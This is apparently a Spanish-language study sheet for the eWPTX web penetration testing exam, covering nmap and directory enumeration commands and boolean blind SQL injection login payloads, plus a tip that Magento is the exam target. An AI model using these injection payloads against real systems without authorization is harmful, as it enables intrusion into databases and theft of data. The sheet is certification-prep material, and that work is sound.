# eWPTX
Tools
## Escaneo de puertos
![image](https://github.com/user-attachments/assets/02a7281d-02c7-43ec-afe6-ece2eecf0317)

nmap -n -Pn -p- --open -vvv -T5 [IP] 

## Enumeración
![image](https://github.com/user-attachments/assets/1d95388b-e208-4b30-8e2c-ad1943a44dee)

dirb http://172.17.0.2/ [rockyou, common, big] -N 401 (Ignora un método) -r (No es recursivo)
##
dirsearch -u http://[IP]/ -w [WORDLIST] -t 16 -e php,txt -f (NO ESTÁ DISPONIBLE EN EL EXAMEN)



## Inyección SQL (SQLi): Blind SQLi
En el examen: MAGENTO ES VULNERABLE A SQLi

En las inyecciones a ciegas, el resultado no se ve en la pantalla (son deductivas... a partir del comportamiento de la aplicación)
### BOOLEAN
Tiene un comportamiento verdadero o falso (0 o 1)

|User: |' OR 1=1-- -|
|----|-----|
|Pass: |' OR 1=1-- -|

|User: |' OR (substring(database(),1,1))='p' -- -|
|-------|-------------|
|Pass: |' OR (substring(database(),1,1))='p' -- -|

|User: |' OR (ascii(substring(database(),1,1)))='45' -- -|
|----|----|
|Pass: |' OR (ascii(substring(database(),1,1)))='45' -- -|

|User: |' OR (ascii(substring(database(),1,1)))>'45' -- -|
|----|----|
|Pass: |' OR (ascii(substring(database(),1,1)))>'45' -- -|

Se puede automatizar con el BurpSuite:

Intruder --> payloads (numero) --> 32-126 

settings --> Redirections (always)


---
### TIME
Tiempo de carga (¿Cuanto demora en carga una página web?)
### OOB
Si se puede lelvar la info fuera del servidor
## 

## Estratégia
1. Iniciar por el CMS MAGENTO
